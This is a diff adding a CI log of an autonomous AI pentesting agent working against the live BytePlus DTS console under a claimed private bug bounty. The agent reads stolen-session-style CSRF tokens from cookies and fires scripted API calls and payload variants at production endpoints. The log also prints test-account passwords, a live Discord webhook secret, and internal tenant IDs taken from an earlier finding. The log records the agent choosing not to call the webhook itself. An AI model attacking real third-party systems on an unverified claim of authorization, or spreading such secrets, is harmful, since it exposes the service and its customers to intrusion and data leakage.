@@ -4209,3 +4209,1434 @@ OpenCode reinstalled; restarting testing from preserved result/ state.
 
 WATCHDOG: no agent output for 120s; terminating attempt 1.
 WATCHDOG: time=2026-10-30T09:30:38Z log_bytes=461237
+
+===== OPENCODE RUN 41033977109 2026-10-30T09:31:20Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+[0m→ [0mRead skills/AGENT.md
+[0m
+[0m$ [0mpwd && ls -la && echo "--- data ---" && ls -la data/ 2>/dev/null && echo "--- creds ---" && ls -la creds/ 2>/dev/null && echo "--- skills ---" && ls -la skills/ && echo "--- tools ---" && ls -la tools/ 2>/dev/null && echo "--- result ---" && ls -la result/ 2>/dev/null
+/home/runner/work/aaii-aautomattionn/aaii-aautomattionn
+total 48
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 .
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 ..
+drwxr-xr-x  7 runner runner 4096 Oct 30 09:31 .git
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 .github
+-rw-r--r--  1 runner runner  355 Oct 30 09:30 .gitignore
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 creds
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 data
+-rw-r--r--  1 runner runner  332 Oct 30 09:31 opencode.json
+drwxr-xr-x  7 runner runner 4096 Oct 30 09:31 result
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 skills
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 tools
+drwxr-xr-x 17 runner runner 4096 Oct 30 09:30 vulnebleti
+--- data ---
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner    0 Oct 30 09:30 .gitkeep
+-rw-r--r--  1 runner runner  391 Oct 30 09:31 targets.txt
+--- creds ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner    0 Oct 30 09:30 .gitkeep
+-rw-r--r--  1 runner runner  466 Oct 30 09:30 README.md
+-rw-r--r--  1 runner runner  196 Oct 30 09:30 test-account.txt
+--- skills ---
+total 76
+drwxr-xr-x  2 runner runner  4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner  4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner     0 Oct 30 09:30 .gitkeep
+-rw-r--r--  1 runner runner 35029 Oct 30 09:30 AGENT.md
+-rw-r--r--  1 runner runner 11864 Oct 30 09:30 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Oct 30 09:30 server-side-skill.md
+--- tools ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rwxr-xr-x  1 runner runner 2106 Oct 30 09:30 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Oct 30 09:30 cmd.txt
+--- result ---
+total 36
+drwxr-xr-x  7 runner runner 4096 Oct 30 09:31 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner    0 Oct 30 09:30 .gitkeep
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:31 client-side
+-rw-r--r--  1 runner runner  178 Oct 30 09:30 confirmed-vuln.txt
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 findings
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:31 inventory
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 logs
+-rw-r--r--  1 runner runner 2128 Oct 30 09:30 scope.md
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:31 server-side
+[0m
+[0m$ [0mecho "=== targets.txt ==="; cat data/targets.txt; echo; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo; echo "=== creds/README.md ==="; cat creds/README.md; echo; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo; echo "=== opencode.json ==="; cat opencode.json; echo; echo "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt
+=== targets.txt ===
+Target:
+https://console.byteplus.com/dts/region:dts+ap-southeast-1/?
+
+test all sub routes under this /dts/*
+
+note: this is inscope domain this program have private bbp.
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+=== creds/test-account.txt ===
+byteplus console test login creds
+
+https://console.byteplus.com/auth/login/
+
+test account a
+
+```
+adoringjepsen1@fearlessmails.com
+Acd3423@#345566
+```
+
+test account b
+```
+testt456
+Acd3423@#345
+```
+
+=== creds/README.md ===
+# creds/
+
+This public repository intentionally contains disposable test credentials.
+
+- `test-account.txt` — public test login for authorized targets.
+
+Test-account emails, passwords, cookies, and tokens may appear in `result/`
+reports, logs, and evidence. They are disposable and intentionally public.
+
+Never add real, valuable, or third-party credentials to this directory. If real
+credentials are ever needed, use GitHub Actions secrets and do not commit them.
+
+=== tools/cmd.txt ===
+opencode run --model opencode/deepseek-v4.1-flash-free "Read \`skills/AGENT.md\` and follow all instructions exactly."
+
+=== opencode.json ===
+{
+  "$schema": "https://opencode.ai/config.json",
+  "autoupdate": false,
+  "permission": "allow",
+  "share": "disabled",
+  "mcp": {
+    "chrome-devtools": {
+      "type": "local",
+      "command": [
+        "npx",
+        "-y",
+        "chrome-devtools-mcp@latest",
+        "--browser-url=http://127.0.0.1:9222"
+      ]
+    }
+  }
+}
+
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+[0m
+[0m$ [0mecho "=== scope.md ==="; cat result/scope.md; echo; echo "=== logs ==="; find result/logs -type f -maxdepth 3 -print -exec echo '---' \; ; echo "=== inventory ==="; find result/inventory -type f -maxdepth 2 -print; echo "=== findings tree ==="; find result/findings -maxdepth 3 -print; echo "=== client-side ==="; find result/client-side -maxdepth 3 -print; echo "=== server-side ==="; find result/server-side -maxdepth 3 -print; echo "=== testing-inventory ==="; ls -la result/testing-inventory.json 2>/dev/null || echo missing
+=== scope.md ===
+# Scope
+
+## User Instructions
+
+Source: `data/targets.txt` (read completely).
+
+- Target: `https://console.byteplus.com/dts/region:dts+ap-southeast-1/?`
+- Instruction: test all sub-routes under `/dts/*`.
+- Note: `console.byteplus.com` is stated to be an in-scope domain for a private
+  bug bounty program.
+- "Important note": if a confirmed vuln is found, send a direct Discord
+  notification to the webhook listed in `data/targets.txt`.
+
+### How the instructions affect the test plan
+
+- In-scope test surface: `https://console.byteplus.com/dts/*` and the
+  same-origin JavaScript/API resources required to exercise those routes.
+- No other origin, subdomain, third-party service, or unrelated path will be
+  tested.
+- The Discord webhook is an external side effect. Per AGENT.md Sections 2.5,
+  6 and 9, notification is handled by the CI workflow through
+  `result/confirmed-vuln.txt`; no manual external webhook call will be made by
+  the agent. This avoids unauthorized external side effects and credential/
+  evidence exfiltration. Any confirmed finding will be written to
+  `result/confirmed-vuln.txt` (which the workflow forwards).
+- Test accounts from `creds/test-account.txt` may be used for authorized login
+  tests.
+
+## Classification
+
+- URL-list / route-prefix target: `console.byteplus.com` `/dts/*`.
+
+## Authorization Source / Assumptions
+
+- `data/targets.txt` explicitly authorizes `console.byteplus.com/dts/*` for this
+  private BBP run. Testing is limited to that prefix on that host.
+
+## In-Scope Components
+
+- `https://console.byteplus.com/dts/*` UI routes.
+- Same-origin static JavaScript and API calls required to exercise `/dts/*`.
+
+## Explicitly Out of Scope
+
+- Any other host or subdomain, including unrelated `*.byteplus.com` assets.
+- Third-party origins, CDNs, partner systems, acquisitions.
+- Other console product areas outside `/dts/*`.
+- Destructive/DoS/brute-force testing; real-user data.
+
+## Program Restrictions Discovered
+
+- From `data/targets.txt`: private BBP, console.byteplus.com in scope.
+- Standard AGENT.md safety rules apply (test-owned data, no destructive tests,
+  no real-user harm).
+
+=== logs ===
+result/logs/agent-exit-code.txt
+---
+result/logs/opencode/41029612104/diagnostics-index.txt
+---
+result/logs/opencode/41029612104/opencode.log
+---
+result/logs/opencode/41029612104/chrome-mcp.log
+---
+result/logs/diagnostics-index.txt
+---
+result/logs/agent-watchdog.txt
+---
+result/logs/target-state.txt
+---
+result/logs/auto-restart-requested.txt
+---
+result/logs/opencode.log
+---
+result/logs/session.md
+---
+result/logs/targets.used.txt
+---
+result/logs/opencode-reinstall-20261030T092820Z.log
+---
+result/logs/targets.sha256
+---
+=== inventory ===
+=== findings tree ===
+result/findings
+result/findings/DTS-INFO-001
+result/findings/DTS-INFO-001/response.json
+=== client-side ===
+result/client-side
+=== server-side ===
+result/server-side
+=== testing-inventory ===
+missing
+[0m
+[0m$ [0mfor f in result/logs/target-state.txt result/logs/targets.sha256 result/logs/targets.used.txt result/logs/agent-exit-code.txt result/logs/agent-watchdog.txt result/logs/auto-restart-requested.txt result/logs/session.md result/logs/diagnostics-index.txt; do echo "=== $f ==="; cat "$f" 2>/dev/null; echo; done
+=== result/logs/target-state.txt ===
+run_id=41029612104
+event=workflow_dispatch
+timestamp=2026-10-30T08:55:03Z
+target_hash=ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+previous_hash=7f8307f45ca9e92f7db2f002cb8c16cf01320f9db434bddca9dc3ba2c65c9eb1
+decision=reset
+---
+run_id=41033977109
+event=workflow_dispatch
+timestamp=2026-10-30T09:31:17Z
+target_hash=ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+previous_hash=ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+decision=preserved
+---
+
+=== result/logs/targets.sha256 ===
+ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+
+=== result/logs/targets.used.txt ===
+Target:
+https://console.byteplus.com/dts/region:dts+ap-southeast-1/?
+
+test all sub routes under this /dts/*
+
+note: this is inscope domain this program have private bbp.
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+=== result/logs/agent-exit-code.txt ===
+2026-10-30T09:28:20Z attempt=3 status=124 watchdog=true recovery=0
+2026-10-30T09:30:45Z attempt=1 status=124 watchdog=true recovery=1
+
+=== result/logs/agent-watchdog.txt ===
+watchdog_terminated=true
+watchdog_terminated_at=2026-10-30T09:28:20Z
+last_log_bytes=460890
+attempts=3
+recovery=0
+watchdog_terminated=true
+watchdog_terminated_at=2026-10-30T09:30:45Z
+last_log_bytes=461237
+attempts=1
+recovery=1
+
+=== result/logs/auto-restart-requested.txt ===
+time=2026-10-30T09:30:45Z
+reason=no output for 120s after OpenCode reinstall
+run_id=41029612104
+
+=== result/logs/session.md ===
+# Session Metadata
+
+- Start time (UTC): 2026-10-30T08:55:26Z
+- Target(s): https://console.byteplus.com/dts/region:dts+ap-southeast-1/ (all /dts/* sub-routes)
+- Agent/model: opencode / opencode/deepseek-v4.1-flash-free
+- Environment: GitHub Actions ubuntu-latest runner (linux x86_64)
+- Tool versions:
+  - opencode: /home/runner/.opencode/bin/opencode
+  - curl: /usr/bin/curl
+  - git: /usr/bin/git
+  - node: v22.23.4
+  - npx: present
+  - python3: /usr/bin/python3
+  - Chrome: Google Chrome 156.0.8078.73
+  - Chrome DevTools endpoint: http://127.0.0.1:9222 (reachable)
+  - chrome-devtools MCP: available in session
+- Prior state: target-state decision=reset (target input changed); starting fresh.
+
+=== result/logs/diagnostics-index.txt ===
+result/logs/agent-exit-code.txt 134 bytes
+result/logs/agent-watchdog.txt 226 bytes
+result/logs/auto-restart-requested.txt 96 bytes
+result/logs/opencode-reinstall-20261030T092820Z.log 1052 bytes
+result/logs/opencode.log 461350 bytes
+result/logs/opencode/41029612104/chrome-mcp.log 6718 bytes
+result/logs/opencode/41029612104/diagnostics-index.txt 0 bytes
+result/logs/opencode/41029612104/opencode.log 5507 bytes
+result/logs/session.md 696 bytes
+result/logs/target-state.txt 249 bytes
+result/logs/targets.sha256 65 bytes
+result/logs/targets.used.txt 391 bytes
+[0m
+[0m$ [0mecho "=== DTS-INFO-001 response.json ==="; cat result/findings/DTS-INFO-001/response.json; echo; echo "=== opencode.log tail ==="; tail -c 30000 result/logs/opencode.log
+=== DTS-INFO-001 response.json ===
+{"capturedAt":"2026-10-30T09:17:36.196Z","url":"/api/top/dts/ListMgrCustomerParam/2018-01-01/ap-southeast-1","accountA":"3000823185","authenticated":{"status":200,"headers":{"access-control-allow-credentials":"true","access-control-allow-origin":"https://console.byteplus.com","access-control-expose-headers":"X-XSRF-TOKEN","alt-svc":"h3=\":443\"; ma=93600","cache-control":"max-age=0, no-cache, no-store","content-encoding":"gzip","content-length":"749","content-type":"application/json; charset=utf-8","date":"Fri, 30 Oct 2026 09:17:36 GMT","expires":"Fri, 30 Oct 2026 09:17:36 GMT","pragma":"no-cache","quic-version":"0x00000001","server":"TLB","server-timing":"cdn-cache; desc=MISS, edge; dur=237, origin; dur=199, inner; dur=183,inner; dur=179,inner; dur=117","upstream-caught":"1793351856475127","vary":"Accept-Encoding","x-akamai-request-id":"1b53ebcf.45182bc5","x-cache":"TCP_MISS from a2-17-114-140.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-cache-remote":"TCP_MISS from a23-52-40-172.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-need-token":"099631cbca7c610fcbd9cdafa75811f0","x-origin-response-time":"199,23.52.40.172","x-parent-response-time":"430,2.17.114.140","x-tt-logid":"20261030091735D5619528319247353F96","x-tt-trace-host":"01faab45bfb804624c9328f7a264b6bcf5a896e4be9fa94dac4b6813099b302aa48e4089e0924f8e38761b76ec2cbe7517970273de91a4f1fdbb962644414272aa87d04cecde0519095f58da6d22d571642fc78da3d33d02f903dd2c37d8de894b","x-tt-trace-id":"00-261030091735D5619528319247353F96-5484095D8C672A0E-00","x-tt-trace-tag":"id=16;cdn-cache=miss;type=dyn"},"body":"{\"ResponseMetadata\":{\"RequestId\":\"20261030091735D5619528319247353F96-6d04cd\",\"Action\":\"ListMgrCustomerParam\",\"Version\":\"2018-01-01\",\"Service\":\"dts\",\"Region\":\"ap-southeast-1\"},\"Result\":{\"Params\":[{\"DefaultValue\":\"\",\"Desc\":\"Mongo 数据订阅租户开关,*表示全部开启\",\"Name\":\"EnableMongoSubTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"*\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"SQL Server 迁移租户开关，*表示全部开启\",\"Name\":\"EnableMSSQLTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"*\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"RDS Sharding 迁移租户开关，* 表示全部开启\",\"Name\":\"EnableRDSShardingTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"1600000106\\\",\\\"3000006772\\\",\\\"1600000101\\\",\\\"3000001999\\\",\\\"2100222151\\\",\\\"2100584669\\\",\\\"2100222152\\\",\\\"1600000105\\\",\\\"2100365179\\\",\\\"2100365181\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"启用ByteES租户开关，*代表全开\",\"Name\":\"EnableByteESTenantIDList\",\"Source\":\"\",\"Value\":\"[\\\"1600000101\\\"]\"},{\"DefaultValue\":\"[\\\"*\\\"]\",\"Desc\":\"订阅任务可以使用自定义bytedancemq的租户，*代表所有\",\"Name\":\"EnableUsingCustomByteDanceMQTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"*\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"订阅任务可以使用自定义内部bmq的租户，*代表所有\",\"Name\":\"EnableUsingCustomInnerByteDanceMQTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"2100365179\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"订阅任务可以使用自定义内场rmq的租户，*代表所有\",\"Name\":\"EnableUsingCustomByteDanceRMQTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"2100365179\\\",\\\"3000619337\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"MySQL Sharding 订阅租户开关, *表示全部开启\",\"Name\":\"EnableSubscriptionVolcShardingWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"1600000101\\\",\\\"2000006376\\\",\\\"2100157781\\\",\\\"2100222151\\\",\\\"2100584669\\\",\\\"2100222152\\\",\\\"2100365179\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"RDS Sharding 同步租户开关，* 表示全部开启\",\"Name\":\"EnableSyncRDSShardingTenantWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"1600000106\\\",\\\"3000006772\\\",\\\"1600000101\\\",\\\"2100222151\\\",\\\"2100584669\\\",\\\"3000006772\\\",\\\"2100222152\\\",\\\"2110030910\\\",\\\"2110030915\\\",\\\"2106096785\\\"]\"},{\"DefaultValue\":\"\",\"Desc\":\"使用火山企业版redis租户开关，*表示全部开启\",\"Name\":\"EnableVolcEnterpriseRedisWhiteList\",\"Source\":\"\",\"Value\":\"[\\\"2100365189\\\",\\\"3000738311\\\",\\\"3000968188\\\"]\"}]}}"},"csrfOnlyNoSession":{"status":200,"headers":{"access-control-allow-credentials":"true","access-control-allow-origin":"https://console.byteplus.com","access-control-expose-headers":"X-XSRF-TOKEN","alt-svc":"h3=\":443\"; ma=93600","cache-control":"max-age=0, no-cache, no-store","content-encoding":"gzip","content-length":"204","content-type":"application/json; charset=utf-8","date":"Fri, 30 Oct 2026 09:17:37 GMT","expires":"Fri, 30 Oct 2026 09:17:37 GMT","pragma":"no-cache","quic-version":"0x00000001","server":"TLB","server-timing":"cdn-cache; desc=MISS, edge; dur=477, origin; dur=25, inner; dur=5,inner; dur=1","upstream-caught":"1793351857191512","vary":"Accept-Encoding","x-akamai-request-id":"4d0850dd.13b18d7.281240c","x-cache":"TCP_MISS from a23-218-223-74.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-cache-remote":"TCP_MISS from a23-49-99-198.deploy.akamaitechnologies.com (AkamaiGHost/22.7.0-e687e9264c02f058b1bf8e920219e21f) (-)","x-need-token":"8b13c7ddf17a645320fff792b453c01c","x-origin-response-time":"25,23.52.40.175","x-parent-response-time":"93,23.49.99.198, 499,23.218.223.74","x-tt-logid":"202610300917365EBDBDB569D93A47AFC1","x-tt-trace-host":"01b48de4bc688afa82fbf7ec37e2cce851a652dce4e4f770722aa1cf0f1c56846b5ada38929d1de6d77d6077ee63a012de07ceb836e2d6e7d9c036edb63f75451f6f73cbf4b33fa1bdbbf54b5405221c234b0a55756bb2dc2d1f3e238de8b64aae6913c0de79038d89a6b061d855f447635568bc6203c90dc06e249734e1bc38a4","x-tt-trace-id":"00-2610300917365EBDBDB569D93A47AFC1-4CFA333C3135A2D3-00","x-tt-trace-tag":"id=16;cdn-cache=miss;type=dyn"},"body":"{\"ResponseMetadata\":{\"RequestId\":\"202610300917365EBDBDB569D93A47AFC1\",\"Action\":\"ListMgrCustomerParam\",\"Version\":\"2018-01-01\",\"Service\":\"dts\",\"Region\":\"ap-southeast-1\",\"Error\":{\"Code\":\"InvalidCSRFToken\",\"Message\":\"Invalid CSRF token.\"}}}"},"noCsrfNoSession":{"status":200,"body":"{\"ResponseMetadata\":{\"RequestId\":\"2026103009173603D4D28BEF6A18B44CF4\",\"Action\":\"ListMgrCustomerParam\",\"Version\":\"2018-01-01\",\"Service\":\"dts\",\"Region\":\"ap-southeast-1\",\"Error\":{\"Code\":\"InvalidCSRFToken\",\"Message\":\"Invalid CSRF token.\"}}}"}}
+=== opencode.log tail ===
+w Promise(((a,o)=>{var i=e=>{try{s(n.next(e))}catch(t){o(t)}},r=e=>{try{s(n.throw(e))}catch(t){o(t)}},s=e=>e.done?a(e.value):Promise.resolve(e.value).then(i,r);s((n=n.apply(e,t)).next())}));var V=Object.defineProperty,M=Object.defineProperties,Y=Object.getOwnPropertyDescriptors,R=Object.getOwnPropertySymbols,x=Object.prototype.hasOwnProperty,B=Object.prototype.propertyIsEnume'
+--
+6600.6203c101.js 43155 'n.d(t,{Tr:function(){return b},h$:function(){return S},jT:function(){return C},Np:function(){return I},Rn:function(){return D},g7:function(){return w}});var a=n(86905),o=n(67294),i=n(747),r=n(5893),s=n(63185),l=n(14573),c=n(77381),d=n(83317),u=n(99908),p=n(77886),T=n(74802),f=n(96486),k=(n(43494),n(39180)),_=Object.defineProperty,h=Object.getOwnPropertySymbols,y=Object.prototype.hasOwnProperty,m=Object.prototype.propertyIsEnumerable,g=(e,t,n)=>t in e?_(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,v=(e,t)=>{for(var n in t||(t={}))y.call(t,n)&&g(e,n,t[n]);if(h)for(var n of h(t))m.call(t,n)&&g(e,n,t[n]);return e};function b(e){var t;const n=(0,o.useRef)(null!=(t=s.i.getProject())?t:"");return(0,i.TS)((()=>{var t,a;n.current=null==(t=i.cr.project)?void 0:t.currentProject,null==(a=null==e?void 0:e.current)||a.refresh()})),(0,l.TS)((t=>{var a;(c.Y||i.U8.isPublic)&&(n.current=t,nu'
+--
+2382.bc8c653e.js 399 'Chunkstorage_dts=window.webpackChunkstorage_dts||[]).push([[2382],{85024:function(e,n,t){t.d(n,{O6:function(){return P},YW:function(){return _},X3:function(){return h},TZ:function(){return b},rs:function(){return g},eA:function(){return y}});var r=t(50465),i=t(3067),o=t(711),c=t(747),u=t(73458),l=t(39180),a=(t(5185),t(45087)),s=t(58120),d=t(83656),f=t(86905),p=t(96486),v=(Object.defineProperty,Object.defineProperties,Object.getOwnPropertyDescriptors,Object.getOwnPropertySymbols,Object.prototype.hasOwnProperty,Object.prototype.propertyIsEnumerable,(e,n,t)=>new Promise(((r,i)=>{var o=e=>{try{u(t.next(e))}catch(n){i(n)}},c=e=>{try{u(t.throw(e))}catch(n){i(n)}},u=e=>e.done?r(e.value):Promise.resolve(e.value).then(o,c);u((t=t.apply(e,n)).next())})));const m=new u.TO;function P(e,n,t){return v(this,null,(function*(){e?yield m.jumpToFinancePay(e,(0,l.PV)({path:n,region:t||(0,c.w9)()||""})):i.Z.error'
+--
+2382.bc8c653e.js 6680 'nite(v)&&v<0?r.oc.t("expected_refund",{},"\\u9884\\u8ba1\\u9000\\u6b3e"):r.oc.t("configuration_fee",{},"\\u914d\\u7f6e\\u8d39\\u7528"),total:v,originalTotal:m,hidePriceInfo:!1===(null==(i=o.InstancePrice)?void 0:i.QueryDiscountPrice),unit:l===f.bn.PrePaid?"":r.oc.t("hour",{},"\\u5c0f\\u65f6"),detailList:h}}},39180:function(e,n,t){t.d(n,{jB:function(){return u},Dv:function(){return l},P7:function(){return a},qb:function(){return s},PV:function(){return f},PP:function(){return p},O2:function(){return v},xg:function(){return m}});var r=t(50465),i=t(747),o=t(20721),c=(e,n,t)=>new Promise(((r,i)=>{var o=e=>{try{u(t.next(e))}catch(n){i(n)}},c=e=>{try{u(t.throw(e))}catch(n){i(n)}},u=e=>e.done?r(e.value):Promise.resolve(e.value).then(o,c);u((t=t.apply(e,n)).next())}));const u=e=>c(undefined,null,(function*(){try{return[null,yield e]}catch(n){const e=n;return i.Hj.error(r.oc.t("request_error",{},"\\u8bf7\\u6c42\\u'
+--
+[0m
+[0m⚙ [0mchrome-devtools_list_pages Unknown
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ids=['2116046640132395013','2115010358560165895'];\n  const out={account:document.cookie.match(/AccountID=([^;]+)/)?.[1]||null};\n  for(const id of ids){\n    const r=await fetch('/api/top/dts/DescribeDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:id})});\n    out[id]=await r.text();\n  }\n  return out;\n}","filePath":"/tmp/b_ds.json","waitForStableDom":false}
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+d=json.load(open('/tmp/b_ds.json'))
+print('account',d['account'])
+for k,v in d.items():
+    if k=='account': continue
+    print('===',k)
+    print(v[:2500])
+PY
+account 3001021825
+=== 2116046640132395013
+{"ResponseMetadata":{"RequestId":"20261030091859F9330A1E2094837B3F06-c6c298","Action":"DescribeDataSource","Version":"2022-10-01","Service":"dts","Region":"ap-southeast-1"},"Result":{"DataSource":{"Category":"MySQL","CreateTime":1793350809819,"DataSourceId":"2116046640132395013","EndpointType":"Public_MySQL","ModifyTime":1793351406208,"Name":"aaitest-ds-b-renamed","PublicMySQLSettings":{"Host":"192.0.2.1","Password":"aaitestpass","Port":3306,"RegionSettings":{"Region":"ap-southeast-1"},"Username":"aaitest"}}}}
+=== 2115010358560165895
+{"ResponseMetadata":{"RequestId":"202610300918597AA73CD2A16A112813B0-4e9537","Action":"DescribeDataSource","Version":"2022-10-01","Service":"dts","Region":"ap-southeast-1"},"Result":{"DataSource":{"Category":"MySQL","CreateTime":1793350890190,"DataSourceId":"2115010358560165895","EndpointType":"Public_MySQL","Name":"aaitest-ma-b-20261030","PublicMySQLSettings":{"Host":"192.0.2.1","Password":"aaitestpass","Port":3306,"RegionSettings":{"Region":"ap-southeast-1"},"Username":"aaitest"}}}}
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const body={SrcConfig:src,DestConfig:dst,SolutionSettings:{},TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n  const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n  const t=await r.text();\n  return {status:r.status,body:body,resp:t};\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const variants=[\n    {SolutionSettings:{MySQL2MySQLSettings:{}}},\n    {SolutionSettings:{SolutionType:'MySQL2MySQL',MySQL2MySQLSettings:{}}},\n    {SolutionSettings:{MySQL2MySQL:{}}},\n  ];\n  const out=[];\n  for(const v of variants){\n    const body={SrcConfig:src,DestConfig:dst,...v,TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n    const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({variant:Object.keys(v),resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const variants=[\n    [{MySQL2MySQLSettings:{ObjectMappings:[]}}],\n    [{MySQL2MySQLSettings:{},ObjectMappings:[]}],\n    [{MySQL2MySQLSettings:{ObjectMappings:[{SrcObjName:'aaitest',DestObjName:'aaitest',ObjectType:'Table'}]}}],\n  ];\n  const out=[];\n  for(const [ss] of variants){\n    const 